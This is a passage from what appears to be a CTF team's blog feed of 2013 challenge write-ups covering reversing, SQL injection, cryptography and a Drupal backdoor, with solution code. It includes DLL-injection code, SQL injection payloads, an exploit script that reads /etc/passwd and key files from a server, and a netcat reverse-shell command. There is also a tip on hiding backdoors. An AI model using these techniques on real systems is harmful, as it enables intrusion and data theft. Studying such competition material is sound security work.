                        if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
                        {
                            init_stack[new_cpu.sp_ - 2] = init_stack_byte;
                            operation[ip] = i;
                            return TRUE;
                        }
                    }
                }
                else
                {
                    // No value is popped onto the stack
                    /*if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip))
                    {
                        operation[ip] = i;
                        return TRUE;
                    }*/
                    // return FALSE;
                }
            }
        }
    }


    return FALSE;
}

VOID Process()
{
    struct CPU_ cpu_;
    memset(&amp;cpu_, 0, sizeof(cpu_));

    AllocConsole();
    m_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    Initialize();
    WriteConsoleA(m_hConsole, "Initialization finished.\n", strlen("Initialization finished.\n"), NULL, NULL);

    prepare_teamname(&amp;cpu_, "R3V3rZ3 I5 C00L");
    //prepare_teamname(&amp;cpu_, "blue-lotus");

    char buf[2048];
    sprintf_s(buf, "CPU k_init = %08x %08x %08x %08x\n", 
        cpu_.k_init[0], 
        cpu_.k_init[1],
        cpu_.k_init[2],
        cpu_.k_init[3]);
    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);

    char src[] = "CTF_COOL";
    byte dst[8];
    tean(1, (byte*)src, dst, cpu_.k_init, 8);
    sprintf_s(buf, "Standard stack = %08x %08x\n", 
        *(unsigned int*)dst,
        *(unsigned int*)(dst + 4));
    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);

    byte k_flipped[16];
    byte data_flipped[16] = {0};
    for(int i = 0; i &lt; 8; ++i)
    {
        k_flipped[i * 2] = ((byte*)cpu_.k_init)[i * 2 + 1];
        k_flipped[i * 2 + 1] = ((byte*)cpu_.k_init)[i * 2];
    }

    struct CPU_ new_cpu;
    int uFinalIp;
    byte init_stack[8];
    init_stack[7] = dst[7];
    memset(&amp;new_cpu, 0, sizeof(struct CPU_));
    new_cpu.sp_ = 1;
    BOOL result = Search(k_flipped, 0, &amp;new_cpu, dst, data_flipped, &amp;uFinalIp, init_stack);

    sprintf_s(buf, "Result = %x, final_ip = %x\n",
        result,
        uFinalIp);
    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);

    byte data[25] = {0};
    // First 16 bytes
    for(int i = 0; i &lt; 8; ++i)
    {
        data[i * 2] = data_flipped[i * 2 + 1];
        data[i * 2 + 1] = data_flipped[i * 2];
    }
    data[16] = (byte)uFinalIp;
    // 17 ~ 25 bytes
    for(int i = 17; i &lt; 25; ++i)
    {
        data[i] = init_stack[i - 17];
    }

    // Convert it to keys
    char szAllowedChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    char final_key[41] = {0};
    int pos = 0;
    int key_pos = 0;
    int bit_left = 0;
    int s = 0;
    while(pos &lt; 25)
    {
        s = (s &lt;&lt; 8) | data[pos];
        ++pos;
        bit_left += 8;
        while(bit_left &gt;= 5)
        {
            int x = (s &gt;&gt; (bit_left - 5)) &amp; 0x1f;
            final_key[key_pos ++] = szAllowedChars[x];
            bit_left -= 5;
        }
        s = s &amp; 0x1f;
    }
    WriteConsoleA(m_hConsole, final_key, strlen(final_key), NULL, NULL);
}

BOOL WINAPI Inject(DWORD dwProcessID)
{
    TCHAR strModulePath[2000] = {0};
    GetModuleFileName(m_hModule, strModulePath, 2000);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessID);
    FARPROC farLoadLibrary = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
    LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, wcslen(strModulePath) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE); 
    if(lpDllAddr != NULL)
    {
        if(WriteProcessMemory(hProcess, lpDllAddr, strModulePath, wcslen(strModulePath) * sizeof(TCHAR), NULL))
        {
            HANDLE hT = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)farLoadLibrary, lpDllAddr, 0, NULL);   
            CloseHandle(hT);
            CloseHandle(hProcess);
            return TRUE;
        }
    }
    return FALSE;
}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[UFOCTF2013 Web100 FlagStore]]></title>
    <link href="http://www.blue-lotus.net//ufoctf2013-web100-flagstore/"/>
    <updated>2013-07-23T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//ufoctf2013-web100-flagstore</id>
    <content type="html"><![CDATA[<p>It is a very interesting problem and exhausted our much time and energy.</p>

<p>There are 3 levels.All about sqli.</p>

<p>The first level only needs username and password.After trying for several hours with some common sqli like ‘ or ’1′=’1 and so on but all failed,I accidentally found that ” or “1″=”1 made sense.And @fqj use sqlmap to find the true username and level1_password in the database.(sqlmap also told that the database is sqlite).</p>

<p>The second level needs username,level1_password and level2_password.<em>Note that you must back to level 1 and use true username and password to get to level2 again or you’ll never go ahead anymore</em>.And seeking for more hours,I find that “%” in sqlite can match strings(including empty strings) and “_” can match single char.In this level,”%” is just the payload.And we use “_” to brutefoce the true password.</p>

<p>The third level needs level3_password and a confirm for level3_password.And for payload ‘ or password like ‘%’ — the site told us that password3.1 passed but password3.2 failed.In confirm blank a mistake happened but we know that the sqli took effect.That is enough,by using “_” we can bruteforce the true password(if the site told us only password 3.2 failed then it makes sense).</p>

<p>@H.Shao wrote the script to find the password for level2 and level3 and finally got the FLAG.There is trap in level3,because there is “_” in the level3_password and this time “_” doesnt represent any single char but just “_”.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SIGINT 2013 crypto300 satisfaction]]></title>
    <link href="http://www.blue-lotus.net//sigint-2013-crypto300-satisfaction/"/>
    <updated>2013-07-10T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//sigint-2013-crypto300-satisfaction</id>
    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/</a></p>

<h1 id="sigint-2013-crypto300-satisfaction1"><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">SIGINT 2013 crypto300 satisfaction</a></h1>

<p>Description</p>

<pre><code>Something fishy going on:
you need this
188.40.147.108 2000
This flag does not have a SIGINT_ prefix!
</code></pre>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/server.rb">server.rb</a></p>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/bf.rb">bf.rb</a></p>

<p>The server only runs properly RSA signed brainfuck code.</p>

<pre><code>def valid?(code, cert)
  return false unless code =~ /\A[\[\]+\-\. ]+\Z/
  return false unless cert =~ /\A\d+\Z/
  sig = cert.to_i
  crc = crc32(code)
  test = crc.to_bn.mod_exp($d, $n)
  return sig == test
end

  if(valid_cert)
    puts "got valid code: #{code.inspect}"
    ruby_code = bfdo(code)
    puts "got some ruby code: #{ruby_code.inspect}"
    client.puts eval(ruby_code)
</code></pre>

<p>If the brainfuck code which we submit only contains <code>+-[].</code>, then the sever will calculate the crc of the code and check if it matches the signature.<br />
Then how does <code>crc32()</code> work? The code in the script seems different from classic <a href="http://en.wikipedia.org/wiki/Crc32">CRC32</a>.</p>

<pre><code>def crc32(str)
  mask = 0x04C11DB7
  crc = 0
  str.bytes.each do |byte|
    byte.to_s(2).rjust(8,"0").each_char do |bit|
      h_crc_bit = ( (( crc &amp;amp; 0x80_00_00_00) != 0) ? 1 : 0)
      h_byte_bit = bit.to_i
      if  h_crc_bit == h_byte_bit
        crc = ((crc &amp;lt;&amp;lt; 1)^mask) &amp;amp; 0xffffffff
      else
        crc = (crc &amp;lt;&amp;lt; 1) &amp;amp; 0xffffffff
      end
    end
  end
  return crc
end
</code></pre>

<p>Standard CRC32 is the remainder of a polynomial division of the target string. In practice it employs the finite field GF(2). XOR is equivalent to division in GF(2).<br />
As a hash function, CRC32 is easy to collision.<br />
In the code above, XOR was taken when <code>h_crc_bit == h_byte_bit</code>.<br />
However, in standard CRC32, it should be <code>h_crc_bit == 1 &amp;amp;&amp;amp; h_byte_bit == 1</code><br />
Maybe the new crc32 is more likely to collision.</p>

<p>To study this algorithm, I rewrite it in C++.</p>

<pre><code>unsigned int CRC32_bit(unsigned char data[], int len)
{
        unsigned int r = 0;
        unsigned int s;
        for (int i = 0; i &amp;lt; len; i++) {
                s = data[i] &amp;lt;&amp;lt; 24;
                for (int j = 0; j &amp;lt; 8; j++) {
                        if (!((r ^ s) &amp;amp; 0x80000000))
                        //instead of if (r &amp;amp; 0x80000000)
                                r = (r &amp;lt;&amp;lt; 1) ^ POLY;
                        else
                                r = r &amp;lt;&amp;lt; 1;
                        s = s &amp;lt;&amp;lt; 1;
                }
        }
        return r;
}
</code></pre>

<p>In this problem, it seems that we can’t sign the code because we don’t know the constants in <code>./rsa_keys.rb</code>.<br />
The basic idea is very simple. If we keep the <code>crc=0</code> or <code>crc=1</code>, then signature is always the same with crc(0 or 1). Now we just need to find something excutable whose crc is 0 or 1.</p>

<p>First we should write a brainfuck program whose output is a legal ruby code, then append some useless character to the code to make its crc be 0 or 1.</p>

<p>A simple brainfuck programmer is like this</p>

<pre><code>def bf(s):
        p = 0
        q = 0
        K = 48
        ret = &amp;#039;&amp;#039;
        now = 0
        for c in s:
            if ord(c) &amp;lt; K:
                    if (now != 0):
                            ret += &amp;#039;&amp;lt;&amp;#039;
                            now = 0
                    while (p  ord(c)):
                            p -= 1
                            ret += '-'
            else:                                                                                                                                                                             
                    if (now != 1):                                                                                                                                                            
                            ret += '&amp;gt;'                                                                                                                                                        
                            now = 1                                                                                                                                                           
                    while (q  ord(c)):
                            q -= 1
                            ret += '-'
            ret += '.'
    return ret
</code></pre>

<p>My code is kind of ugly but it does work. (The brainfuck code length is limited to 1000)</p>

<p>Given a crc sum and a byte we can calculate the next crc sum directly.</p>

<pre><code>inline unsigned int extend(unsigned int r, unsigned char s)
{
        return (r &amp;lt;&amp;gt; 24) ^ s];
}
</code></pre>

<p><code>crc_table</code> is a pre-calculated table.</p>

<p>If the crc sum is 0, then `r &lt;&gt; 8;<br />
x |= (i ^ s) « 24;<br />
if (extend(x, s) == r) {<br />
//some code<br />
}<br />
}<br />
}</p>

<p>But charset that we can use is limited, so we don’t need to worry about too many solutions.</p>

<p>I used a bidirectional search algorithm to speed up my search in my code.<br />
<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/crc32.cpp">crc32.cpp</a></p>

<p>It works well even I only use <code>+-</code> to generate collisions.</p>

<pre><code>import subprocess
from time import sleep
from socket import *

...

if __name__ == '__main__' :
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(('188.40.147.108', 2000))
        print s.recv(1024)
        #raw = bf("""client.puts File.readlines("/etc/passwd")#""")
        #raw = bf("""client.puts File.readlines("./the_flag.rb")#""")
        raw = bf("""client.puts File.readlines("./rsa_keys.rb")#""")

        p = subprocess.Popen("./crc32", stdin = subprocess.PIPE, stdout = subprocess.PIPE)
        p.stdin.write(str(len(raw)) + "\n")
        p.stdin.write(raw + "\n")
        suffix = p.stdout.read()

        payload = raw + suffix

        print len(payload)
        print payload

        s.send(payload + "\n")
        s.send("1\n")
        sleep(5)
        print s.recv(4096)
</code></pre>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/go.py">go.py</a><br />
Then I read <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/the_flag.rb">./the_flag.rb</a> and <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/rsa_keys.rb">./rsa_keys.rb</a>.</p>

<p>The FLAG is <code>goozbartouuu</code></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SIGINT 2013 crypto 200 rsa]]></title>
    <link href="http://www.blue-lotus.net//sigint-2013-crypto-200-rsa/"/>
    <updated>2013-07-10T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//sigint-2013-crypto-200-rsa</id>
    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/</a></p>

<h1 id="sigint2013-crypto200-rsa1"><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">SIGINT2013 crypto200 rsa</a></h1>

<p>Description</p>

<pre><code>Cryptography is difficult
authorized_keys
ssh to challenge@188.40.147.109
</code></pre>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/genrsa.py">genrsa.py</a></p>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/authorized_keys">authorized_keys</a></p>

<p>challenge@188.40.147.109的ssh密钥是用genrsa.py生成的。</p>

<pre><code>SEED = int(time())
def randfunc(n):
    def rand():
        global SEED
        ret = SEED*0x1333370023004200babe004141414100e9a1192355de965ab8cc1239cf015a4e35 + 1
        SEED = ret
        return (ret &amp;gt;&amp;gt; 0x10) &amp;amp; 0x7fff
    ret = ""
    while len(ret)  id_rsa.pub &amp;amp;&amp;amp; rm pub")`显然非常慢。更好的办法是从公钥中解出N，每次比较生成的N是否相同。
</code></pre>

<p>RSAPublicKey的结构：</p>

<ul>
  <li>The key type</li>
  <li>A chunk of PEM-encoded data</li>
  <li>A comment</li>
</ul>

<p>PEM是<a href="http://en.wikipedia.org/wiki/Base64#Privacy-enhanced_mail">Privacy Enhanced Mail</a>的缩写。<br />
对于ssh密钥，PEM是由一些小数据块(big-endian)组成的。每一块前面是数据长度，后面就是数据。</p>

<pre><code>def b2i(s):
        ret = 0L
        for i in s:
                ret = (ret &amp;lt;&amp;gt; 0x10) &amp;amp; 0xff
    ret = ""
    while len(ret) &amp;lt; n:
        ret += chr(rand())
    return ret

def guess(x):
        global seed
        seed = x
        keypair = RSA.generate(1024, randfunc)
        if  getattr(keypair, &amp;#039;n&amp;#039;) != N :
            return False
        print getattr(keypair, &amp;#039;n&amp;#039;), x
        return True

if __name__ == &amp;#039;__main__&amp;#039;:
    #now = 1373041808
    now = 1373038672    #answer
    while (not guess(now)):
            now -= 1
            print now
</code></pre>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/my.py">my.py</a></p>

<p>SIGINT_some_people_pay_100_euro_for_this<br />
<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/flag">flag</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SIGINT 2013 cloud200 bloat]]></title>
    <link href="http://www.blue-lotus.net//sigint2013-cloud200-bloat/"/>
    <updated>2013-07-09T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//sigint2013-cloud200-bloat</id>
    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/</a></p>

<h1 id="sigint-2013-cloud-200-bloat1"><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">SIGINT 2013 cloud 200 bloat</a></h1>

<p>Description</p>

<pre><code>My friend set up this site for me. I don't trust him.
He installed a backdoor for sure. Can you find it?
He just wrote me, what this system is using.
Somehow it looks diff-erent o_O:
</code></pre>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz">cdd-7.20.tar_0.gz</a></p>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2">source_code.tar.bz2</a></p>

<p>这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。</p>

<p>我本来预期花一两个小时就能解决这个问题，结果却耗费了四个小时。</p>

<p>首先也是最关键的问题就是如何找到后门。</p>

<p>这个网站使用的是开源系统drupal 7.20，还附带了一些插件。但问题并不是直接diff那么简单。</p>

<p>官方的源码附有详细的注释，但修改版中将所有注释全部删掉了，还把代码风格从K&amp;R风格改成了一种很混乱的样子，甚至将所有的变量名替换成了奇奇怪怪的东西。</p>

<p>手工查找人眼识别几乎是不可行的。必须想其它办法。</p>

<p>比赛的时候卡在其他题上面了，没有时间仔细看这道题。事后才想起来可以写一个文本处理器，把php文件全部“格式化”一遍：去掉注释+统一格式+统一变量命名。</p>

<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/filter.cpp">PHP_filter.cpp</a></p>

<p>处理注释是最麻烦的一步，要判断引号和各种注释符，最终版本的代码也还有瑕疵。</p>

<p>因为只需要比对出文件的不同之处，所以不需要维护代码风格和变量名。为了统一，我把所有可能换行的<code>{};,:()</code>全都强行换行，又将所有变量名指定成了$000。</p>

<p>用这个非常挫的文本处理器半自动操作，效率已经比人眼识别提升很多，而且出错率降低很多。</p>

<p>但是将所有<code>.php</code>文件对比之后并没有什么收获。</p>

<p>再去查看源码中的文件，发现<code>.php</code>的文件其实并不多。很多插件都是以<code>.inc\.module</code>这样的后缀结尾的。</p>

<p>再扫描一遍<code>.inc</code>后缀的文件，果然发现有一个文件<code>./bloat/modules/openid/openid.inc</code>略有不同。</p>

<pre><code>10 define('OPENID_DH_DEFAULT_GEN', '86');
</code></pre>

<p>而原版中的openid是</p>

<pre><code>22 /**
23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
24  */
25 define('OPENID_DH_DEFAULT_GEN', '2');
</code></pre>

<p>这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。</p>

<p>继续看代码，我有了更大的收获。</p>

<p>在<code>./bloat/modules/openid/openid.module</code>中代码逻辑与原版有明显的不同。</p>

<pre><code>197 function openid_login_validate($quench, &amp;amp;$tickers)
198    {
199 $return_to = $tickers['values']['openid.return_to'];
...
204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
... 
207      function openid_begin($imaginably, $overlay = '', $termination = array())
...
212       if(strpos($imaginably, '@'))
213   {
214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
215 }
216 else
217     {
218      $user = false;
219      $host = false;
220      }
</code></pre>

<p><code>214    list($user, $host) = explode('@', $imaginably, 2);</code>中<code>$imaginably</code>正是用户提交的认证用户名。</p>

<p>再来看看这些变量做了什么。</p>

<pre><code>248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
259   openid_redirect($service['uri'], $ramparts);
</code></pre>

<p>这里用到了修改过的常量<code>OPENID_DH_DEFAULT_GEN</code>。</p>

<p>drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成字符串”Array”，最后在跳转的时候会出错。</p>

<p>而这个<a href="https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7">drupal_map_assoc()</a>则暗藏玄机。</p>

<p>根据官方文档，drupal_map_assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。</p>

<p>这里藏着一个命令执行后门啊。。。。</p>

<p>只要<code>is_callable($user_enc)</code>就能直接执行<code>$user_enc($host)</code>。</p>

<p>而<code>$user_enc</code>是从<code>$user * OPENID_DH_DEFAULT_GEN</code>解出来的。</p>

<p>因为<code>OPENID_DH_DEFAULT_GEN</code>的限制，所以这个<code>$user_enc</code>必须是按照base64解成整形之后能整除86（中间还有一些过程）。</p>

<p>现在要做的就是找一个合适的函数，恰好能满足这个条件了。</p>

<pre><code>slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
Interactive shell

php &amp;gt; include './openid.inc';
php &amp;gt; var_dump(is_callable('system'));
bool(true)
php &amp;gt; var_dump(is_callable('systeM'));
bool(true)
php &amp;gt; echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
34952922.72093
php &amp;gt; echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
14664196.395349
php &amp;gt; echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
14347185.046512
php &amp;gt; echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
93703.872093023
php &amp;gt; echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
93802
</code></pre>

<p>因为这里的is_callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^_^</p>

<p><strong>如果以后要用这种方法做后门，记得一个有大因子的大小写混用的函数名哦。</strong></p>

<p>接下来就是命令执行了。</p>

<p>可是用<code>93802@echo a &amp;gt; a</code>结果并没有生成文件a。似乎对网站的目录木有写权限。</p>

<p>如果要获取flag，必须要有传递信息的途径。</p>

<p>唯一能想到的方法就只有反连了。</p>

<p>幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。</p>

<p>用<code>93802@nc x.x.x.x 8080 -e /bin/sh</code>反弹，本地用<code>nc -l 8080</code>监听。</p>

<pre><code>pwd
/var/www
ls -la ./
total 7904
drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
-rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
-rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
...
-rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
...
cat ___F_L_A_G___
not here, see /flag on filesystem
cat /flag
SIGINT_d4b0844c
</code></pre>

<p>看来果然是木有写权限～～</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 4 Writeup]]></title>
    <link href="http://www.blue-lotus.net//def-con-ctf-qualifier-2013-omgacm-4-writeup/"/>
    <updated>2013-06-18T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//def-con-ctf-qualifier-2013-omgacm-4-writeup</id>
    <content type="html"><![CDATA[<h1 id="problem-description">Problem Description</h1>

<p>Each problem gives you a circuit board, which will have a dimension, a set of nulls (that trace cannot go through), a feed point, and a set of antenna points.</p>

<p>Your goal is to draw a trace for each antenna point that starts at the feed point, ends at the antenna point and does not intersect other traces.</p>

<p>The distance of these traces must also be equal for all antenna points.</p>

<h1 id="our-solution">Our Solution</h1>

<p>Since we intuitively classify this problem as NP-Complete, we resort to iterative deepening depth-first search for solving it.</p>

<p>In our algorithm, we choose to “grow” the traces from antenna points, which means that all the traces simultaneously start from their respective antenna point and go one step further one by one.</p>

<p>This strategy forces that all the traces will be equal length with each other, thus many unnecessary states are avoided.</p>

<p>And if one trace encounters with another trace before reaching the feed point, we can simply merge them into one to eschew intersection.</p>

<p>More specifically, in order to record the current state, we use:</p>

<ol>
  <li>Nine bool variables for each point: one for the point and 8 for adjacent edges; </li>
  <li>One pair &lt; int, int &gt; (one for 1 and the other for sqrt 2) variable for each point to store the distance from this point to the corresponding antenna point if it has been covered by a trace; </li>
  <li>Current “growing” point for each trace; </li>
  <li>Which trace’s turn is it to grow in this iteration; </li>
  <li>The final distance, if one of the traces has reached the feed point; </li>
</ol>

<p>And we also use a set of pruning tricks to accelerate the algorithm.</p>

<ol>
  <li>Iterative deepening on length of each path; </li>
  <li>Limit the depth of dfs to be at most 30. (This ought to have been another iterative deepening argument, but we hard code it with an empirical number for simplifying the code); </li>
  <li>Preprocess the minimal distance from each point to the feed point and combine this information with iterative deepening threshold for further pruning; </li>
  <li>If one of the trace has already reached the feed point, use the distance for pruning. </li>
</ol>

<p>Here is another tip:</p>

<p>The intersections will not only happen at points but also in small squares, you may need to double check this.</p>

<h1 id="code">Code</h1>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;map&gt;
#include &lt;set&gt;
#include &lt;vector&gt;
#include &lt;queue&gt;
#include &lt;string.h&gt;
using namespace std;

typedef unsigned long long llu;
#define MAX 100
#define mp make_pair
#define pb push_back

bool Null[MAX][MAX], Null2[MAX][MAX];
int XY[MAX][MAX];
int N, M, eN, fX, fY, P, UP;
int dy[] = {1, 0, -1, 1, -1, 1, 0, -1};
int dx[] = {1, 1, 1, 0, 0, -1, -1, -1};
int verse[] = {8, 7, 6, 5, 4, 3, 2 , 1};
set&lt;vector&lt;bool&gt; &gt; S;
pair&lt;int, int&gt; dp[] = {
    mp(0, 1),
    mp(1, 0),
    mp(0, 1),
    mp(1, 0),
    mp(1, 0),
    mp(0, 1),
    mp(1, 0),
    mp(0, 1)
};

struct node {
    vector&lt;bool&gt; t;
    vector&lt;pair&lt;int, int&gt; &gt; len;
    int cnt;
    pair&lt;int, int&gt; ans;
    vector&lt;pair&lt;int, int&gt; &gt; now;
    vector&lt;bool &gt; used;
    int I;
};
node Key;

int get(int x, int y) {
    return x*M + y;
}

pair&lt;int, int&gt; getLen(int j) {
    return mp(Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].first+dp[j].first, 
        Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].second+dp[j].second);
}

void output(node ans) {
    printf("Solution %d\n", P);
    int kk=0, L=0;
    for (int i=0; i&lt;N*M; i++) {
        kk++;
        int tx = i / M;
        int ty = i % M;
        for (int j=0; j&lt;4; j++, kk++) {
            if (ans.t[kk])
                L++;
        }
        kk+=4;
    }
    printf("Line %d\n", L);
    int k=0;
    for (int i=0; i&lt;N*M; i++) {
        k++;
        int tx = i / M;
        int ty = i % M;
        for (int j=0; j&lt;4; j++, k++) {
            if (ans.t[k])
                printf("Segment %d %d %d %d\n", tx, ty, tx+dx[j], ty+dy[j]);
        }
        k+=4;
    }
}

bool none() {
    for (int i=0; i&lt;eN; i++)
        if (Key.used[i]) return false;
    return true;
}

int myabs(int xx) {
    if (xx&lt;0) return -xx;
    return xx;
}


int UPPER_BOUND = 28;
void dfs(int depth) {
    if (depth &gt; UPPER_BOUND) return;

    int x = Key.now[Key.I].first;
    int y = Key.now[Key.I].second;

    int i = rand() % 8;
    for (int iii=0; iii&lt;8; iii++, i=(i+1)%8) {
        int newX = x + dx[i];
        int newY = y + dy[i];

        if (newX &lt; 0 || newX &gt;= N) continue;
        if (newY &lt; 0 || newY &gt;= M) continue;
        if (Null[newX][newY]) continue;
        if (XY[newX][newY] == -1 || getLen(i).first + getLen(i).second + XY[newX][newY] &gt; UP) continue;
        if (Key.cnt &gt; 0 &amp;&amp;
                            (Key.ans.first &lt; getLen(i).first || Key.ans.second &lt; getLen(i).second) ) continue;
        if (Key.cnt &gt; 0 &amp;&amp;
                            (Key.ans.first == getLen(i).first &amp;&amp; Key.ans.second == getLen(i).second) ) continue;


        if (i == 0) {
            if (Key.t[get(x+1, y) * 9 + 6]) continue;
        }
        if (i == 2) {
            if (Key.t[get(x+1, y) * 9 + 8]) continue;
        }
        if (i == 7) {
            if (Key.t[get(x, y-1) * 9 + 6]) continue;
        }
        if (i == 5) {
            if (Key.t[get(x, y+1) * 9 + 8]) continue;
        }


        if (newX == fX &amp;&amp; newY == fY) {
            if (Key.cnt &gt; 0 &amp;&amp; Key.ans != getLen(i)) continue;
            Key.cnt++; Key.ans = getLen(i);
            Key.t[(newX*M + newY)*9 + verse[i]] = true;
            Key.t[get(x, y)*9 + i + 1] = true;
            Key.used[Key.I] = false;
            Key.now[Key.I] = mp(newX, newY);


            if (Key.cnt &gt; 0 &amp;&amp; none()) {
                output(Key);
                exit(0);
            }

            int II = Key.I, ttt = 0;
            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
                if (Key.used[Key.I])
                    break;
            if (ttt &lt; eN) {
                dfs(depth+1);
            }

            Key.t[(newX*M + newY)*9 + verse[i]] = false;
            Key.t[get(x, y)*9 + i + 1] = false;
            Key.I = II;
            Key.used[Key.I] = true;
            Key.now[Key.I] = mp(x, y);
            Key.cnt--;
        } else if (Key.t[get(newX, newY) * 9]) {
            if (Key.len[newX*M + newY] != getLen(i)) continue;

            Key.t[(newX*M + newY)*9 + verse[i]] = true;
            Key.t[get(x, y)*9 + i + 1] = true;
            Key.used[Key.I] = false;
            Key.now[Key.I] = mp(newX, newY);

            int II = Key.I, ttt = 0;
            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
                if (Key.used[Key.I])
                    break;
            if (ttt &lt; eN) {
                dfs(depth+1);
            }

            Key.t[(newX*M + newY)*9 + verse[i]] = false;
            Key.t[get(x, y)*9 + i + 1] = false;
            Key.I = II;
            Key.used[Key.I] = true;
            Key.now[Key.I] = mp(x, y);
        } else {
            Key.t[(newX*M + newY)*9] = true;
            Key.t[(newX*M + newY)*9 + verse[i]] = true;
            Key.t[get(x, y)*9 + i + 1] = true;
            Key.len[newX*M + newY] = getLen(i);
            Key.now[Key.I] = mp(newX, newY);

            int II = Key.I, ttt = 0;
            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
                if (Key.used[Key.I])
                    break;
            if (ttt &lt; eN) {
                dfs(depth+1);
            }

            Key.t[(newX*M + newY)*9] = false;
            Key.t[(newX*M + newY)*9 + verse[i]] = false;
            Key.t[get(x, y)*9 + i + 1] = false;
            Key.I = II;
            Key.now[Key.I] = mp(x, y);
        }
    }
}

void dfs2(int x, int y) {
    for (int i=0; i&lt;8; i++) {
        int newX = x + dx[i];
        int newY = y + dy[i];

        if (newX &lt; 0 || newX &gt;= N) continue;
        if (newY &lt; 0 || newY &gt;= M) continue;
        if (Null[newX][newY]) continue;

